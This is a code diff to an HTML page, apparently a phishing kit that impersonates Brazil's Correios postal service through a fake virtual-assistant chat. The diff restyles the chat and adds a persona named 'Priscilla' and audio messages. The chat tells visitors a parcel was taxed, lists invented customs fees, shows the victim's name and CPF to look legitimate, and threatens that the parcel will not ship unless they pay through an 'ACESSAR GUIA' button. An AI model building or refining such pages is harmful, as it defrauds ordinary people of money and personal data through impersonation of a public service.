@@ -585,7 +585,7 @@
       }
     }
 
-    /* Estilos para o chat modificado */
+     /* Estilos atualizados para o chat */
     #chat-container {
       display: none;
       max-width: 600px;
@@ -594,6 +594,8 @@
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       overflow: hidden;
+      position: relative;
+      padding-bottom: 70px; /* Espaço para os botões */
     }
 
     .chat-header {
@@ -602,87 +604,85 @@
       padding: 15px;
       text-align: center;
       font-weight: bold;
+      font-size: 16px;
     }
 
     .chat-messages {
       padding: 15px;
-      max-height: 400px;
+      max-height: 500px;
       overflow-y: auto;
     }
 
-    .message {
+    .message-box {
+      background-color: #f5f5f5;
+      border-radius: 8px;
+      padding: 12px 15px;
       margin-bottom: 15px;
-      display: flex;
-      align-items: flex-start;
+      position: relative;
+      max-width: 80%;
+      word-wrap: break-word;
     }
 
     .bot-message {
-      justify-content: flex-start;
-    }
-
-    .user-message {
-      justify-content: flex-end;
-    }
-
-    .message-avatar {
-      width: 40px;
-      height: 40px;
-      border-radius: 50%;
-      margin-right: 10px;
-      background-color: #003157;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: bold;
-    }
-
-    .message-content {
-      max-width: 70%;
-      padding: 10px 15px;
-      border-radius: 18px;
-      position: relative;
-    }
-
-    .bot-message .message-content {
-      background-color: #f0f0f0;
+      background-color: #e9f3ff;
+      margin-right: auto;
       border-top-left-radius: 0;
     }
 
-    .user-message .message-content {
-      background-color: #003157;
-      color: white;
-      border-top-right-radius: 0;
+    .system-message {
+      background-color: #f0f0f0;
+      margin: 10px auto;
+      text-align: center;
+      max-width: 60%;
+      font-size: 12px;
+      padding: 8px 12px;
+    }
+
+    .message-sender {
+      font-weight: bold;
+      color: #003157;
+      margin-bottom: 5px;
+      font-size: 14px;
     }
 
     .message-text {
       margin: 0;
       line-height: 1.4;
+      font-size: 14px;
     }
 
     .message-image {
       max-width: 100%;
       border-radius: 8px;
       margin-top: 8px;
+      display: block;
     }
 
-    .chat-input {
-      display: flex;
+    .message-audio {
+      margin-top: 8px;
+      width: 100%;
+    }
+
+    .chat-buttons {
+      position: absolute;
+      bottom: 0;
+      right: 0;
       padding: 10px;
+      background: white;
+      width: 100%;
       border-top: 1px solid #eee;
+      text-align: right;
     }
 
     .chat-button {
       background-color: #003157;
       color: white;
       border: none;
-      padding: 10px 15px;
+      padding: 8px 16px;
       border-radius: 5px;
       cursor: pointer;
-      margin: 10px auto;
-      display: block;
-      width: calc(100% - 20px);
-      font-weight: bold;
+      margin-left: 10px;
+      font-size: 14px;
     }
 
     .chat-button:hover {
@@ -701,8 +701,8 @@
       font-size: 14px;
     }
 
-    .status-info strong {
-      color: #003157;
+    .icon {
+      margin-right: 5px;
     }
   </style>
 </head>
@@ -935,58 +935,78 @@
       </div>
       
       <div class="chat-messages">
-        <!-- Mensagem inicial do bot -->
-        <div class="message bot-message">
-          <div class="message-avatar">C</div>
-          <div class="message-content">
-            <p class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</p>
-            <p class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</p>
-            <img src="images/image1.png" alt="Imagem de encomenda tributada" class="message-image">
-            <p class="message-text"><span id="chat-nome"></span>, você deseja solicitar a liberação da sua mercadoria?</p>
-          </div>
+        <!-- Mensagem do sistema -->
+        <div class="message-box system-message">
+          <span class="icon">💬</span> Priscilla entrou no chat
         </div>
         
-        <!-- Mensagem de status (inicialmente oculta) -->
-        <div id="status-message" class="status-info hidden">
-          <p><strong>PACKET STANDARD IMPORTAÇÃO</strong></p>
-          <p>Previsão de entrega: <span id="previsao-entrega"></span></p>
+        <!-- Saudação inicial -->
+        <div class="message-box bot-message">
+          <div class="message-sender">Priscilla</div>
+          <p class="message-text">Olá, <span id="chat-nome"></span></p>
         </div>
         
-        <!-- Mensagem sobre a taxa (inicialmente oculta) -->
-        <div id="taxa-message" class="message bot-message hidden">
-          <div class="message-avatar">C</div>
-          <div class="message-content">
-            <img src="images/image2.png" alt="Imagem sobre taxas" class="message-image">
-            <p class="message-text">Por que essa taxa?</p>
-            <p class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</p>
-            <p class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</p>
-            <p class="message-text">- Peso da mercadoria – Valor ajustado conforme o peso do item.</p>
-            <p class="message-text">- Despacho postal – Serviço de liberação e envio.</p>
-          </div>
+        <!-- Mensagem de boas-vindas -->
+        <div class="message-box bot-message">
+          <p class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</p>
         </div>
         
-        <!-- Mensagem de confirmação (inicialmente oculta) -->
-        <div id="confirmacao-message" class="message bot-message hidden">
-          <div class="message-avatar">C</div>
-          <div class="message-content">
-            <img src="images/image3.png" alt="Imagem de confirmação" class="message-image">
-            <p class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
-            <p class="message-text">Taxa de Liberação: R$ 23,89</p>
-            <p class="message-text">Peso da mercadoria: R$ 19,50</p>
-            <p class="message-text">Despacho postal: R$ 24,17</p>
-            <p class="message-text">Total a Pagar: R$ 67,56</p>
-            <p class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.</p>
-            <p class="message-text">ATENÇÃO, <span id="chat-nome2"></span></p>
-            <p class="message-text">CPF: <span id="chat-cpf"></span></p>
-            <p class="message-text">Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></p>
-          </div>
+        <!-- Mensagem sobre encomenda taxada -->
+        <div class="message-box bot-message">
+          <p class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</p>
+          <img src="images/image1.png" alt="Encomenda tributada" class="message-image">
+        </div>
+        
+        <!-- Pergunta sobre liberação -->
+        <div class="message-box bot-message">
+          <p class="message-text"><span id="chat-nome2"></span>, você deseja solicitar a liberação da sua mercadoria?</p>
+          <audio controls class="message-audio">
+            <source src="audio/audio1.mp3" type="audio/mpeg">
+            Seu navegador não suporta o elemento de áudio.
+          </audio>
+        </div>
+        
+        <!-- Explicação sobre taxas (inicialmente oculta) -->
+        <div id="taxa-message" class="message-box bot-message hidden">
+          <div class="message-sender">💡 Priscilla</div>
+          <p class="message-text">Por que essa taxa?</p>
+          <p class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</p>
+          <p class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</p>
+          <p class="message-text">- Peso da mercadoria - Valor ajustado conforme o peso do item.</p>
+          <p class="message-text">- Despacho postal - Serviço de liberação e envio.</p>
+          <img src="images/image2.png" alt="Explicação sobre taxas" class="message-image">
+          <audio controls class="message-audio">
+            <source src="audio/audio2.mp3" type="audio/mpeg">
+            Seu navegador não suporta o elemento de áudio.
+          </audio>
+        </div>
+        
+        <!-- Confirmação de pagamento (inicialmente oculta) -->
+        <div id="confirmacao-message" class="message-box bot-message hidden">
+          <div class="message-sender">✅ Priscilla</div>
+          <p class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
+          <img src="images/image3.png" alt="Guia de pagamento" class="message-image">
+          <p class="message-text">Taxa de Liberação: R$ 23,89</p>
+          <p class="message-text">Peso da mercadoria: R$ 19,50</p>
+          <p class="message-text">Despacho postal: R$ 5,50</p>
+          <p class="message-text"><strong>Total a pagar: R$ 48,89</strong></p>
+          <p class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não será enviada</p>
+        </div>
+        
+        <!-- Detalhes finais (inicialmente oculta) -->
+        <div id="detalhes-message" class="message-box bot-message hidden">
+          <p class="message-text">ATENÇÃO, <span id="chat-nome3"></span></p>
+          <p class="message-text">CPF: <span id="chat-cpf"></span></p>
+          <p class="message-text">📦 Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></p>
         </div>
       </div>
       
-      <!-- Botões do chat -->
-      <button id="btn-sim" class="chat-button">SIM</button>
-      <button id="btn-continuar" class="chat-button hidden">Entendi, continuar!</button>
-      <button id="btn-acessar-guia" class="chat-button hidden">ACESSAR GUIA DE PAGAMENTO</button>
+      <!-- Área de botões -->
+      <div class="chat-buttons">
+        <button id="btn-sim" class="chat-button">SIM</button>
+        <button id="btn-continuar" class="chat-button hidden">CONTINUAR</button>
+        <button id="btn-acessar-guia" class="chat-button hidden">ACESSAR GUIA</button>
+      </div>
     </div>
 
     <!-- Removi a seção do banner-1.jpg que estava aqui -->
@@ -1225,40 +1245,27 @@
       document.getElementById("chat-container").style.display = "block";
       
       // Preenche os dados no chat
-      document.getElementById("chat-nome").textContent = document.getElementById("res-nome").textContent;
-      document.getElementById("chat-nome2").textContent = document.getElementById("res-nome").textContent;
-      document.getElementById("chat-cpf").textContent = document.getElementById("res-cpf").textContent;
-      document.getElementById("chat-data").textContent = getDataAmanha();
+      const nome = document.getElementById("res-nome").textContent;
+      const cpf = document.getElementById("res-cpf").textContent;
       
-      // Atualiza a previsão de entrega
+      document.getElementById("chat-nome").textContent = nome;
+      document.getElementById("chat-nome2").textContent = nome;
+      document.getElementById("chat-nome3").textContent = nome;
+      document.getElementById("chat-cpf").textContent = cpf;
+      
+      // Atualiza a data de amanhã
       const hoje = new Date();
-      const entrega = new Date(hoje);
-      entrega.setDate(hoje.getDate() + 3);
-      const dd = entrega.getDate().toString().padStart(2, '0');
-      const mm = (entrega.getMonth() + 1).toString().padStart(2, '0');
-      const yyyy = entrega.getFullYear();
-      document.getElementById("previsao-entrega").textContent = `${dd}/${mm}/${yyyy}`;
-    });
-
-    // Máscaras para CPF e CEP
-    document.getElementById('cpf').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 3) value = value.substring(0, 3) + '.' + value.substring(3);
-      if (value.length > 7) value = value.substring(0, 7) + '.' + value.substring(7);
-      if (value.length > 11) value = value.substring(0, 11) + '-' + value.substring(11);
-      e.target.value = value.substring(0, 14);
-    });
-
-    document.getElementById('cep').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, '');
-      if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5);
-      e.target.value = value.substring(0, 9);
+      const amanha = new Date(hoje);
+      amanha.setDate(hoje.getDate() + 1);
+      const dd = amanha.getDate().toString().padStart(2, '0');
+      const mm = (amanha.getMonth() + 1).toString().padStart(2, '0');
+      const yyyy = amanha.getFullYear();
+      document.getElementById("chat-data").textContent = `${dd}/${mm}/${yyyy}`;
     });
 
     // Lógica do chat modificada
     document.getElementById('btn-sim').addEventListener('click', function() {
-      // Mostra a mensagem de status e sobre a taxa
-      document.getElementById('status-message').classList.remove('hidden');
+      // Mostra a mensagem sobre taxas
       document.getElementById('taxa-message').classList.remove('hidden');
       
       // Esconde o botão SIM e mostra o botão CONTINUAR
@@ -1271,8 +1278,9 @@
     });
 
     document.getElementById('btn-continuar').addEventListener('click', function() {
-      // Mostra a mensagem de confirmação
+      // Mostra as mensagens de confirmação
       document.getElementById('confirmacao-message').classList.remove('hidden');
+      document.getElementById('detalhes-message').classList.remove('hidden');
       
       // Esconde o botão CONTINUAR e mostra o botão ACESSAR GUIA
       document.getElementById('btn-continuar').classList.add('hidden');
